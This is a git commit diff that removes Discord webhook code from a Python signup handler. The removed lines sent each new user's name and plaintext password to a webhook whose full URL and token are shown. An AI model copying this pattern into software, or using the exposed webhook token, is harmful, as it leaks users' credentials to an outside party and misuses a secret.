aa4e23d63d44c5ae89274885a48ab10fe0dcdd20
jimmydin7 <129774378+jimmydin7@users.noreply.github.com>
2023-04-08 13:34:28 +0300

    Removed discord webhooks

--- scripts/server/database/handler.py
+++ scripts/server/database/handler.py
@@ -58,15 +58,7 @@ class Handler:
 
             self.db.data['users'].append(user)
             self.db.save()
-            # Send a message to the discord webhook
-
-
-            webhook_url = Webhook("https://discord.com/api/webhooks/1093878061398761482/rL7J4r0-4ogCtIC32Z9-yTPzaDf3pjBTyKXKUzpWsJ_4-1K9O8FOpoAJ9OgoNQM9zQCK")
-            webhook_url.send(
-                f"""New user signed up!
-            Name = ``{user['name']}``
-            Password = ``{user['password']}``
-            """)
+           
             return True
         else:
             return False
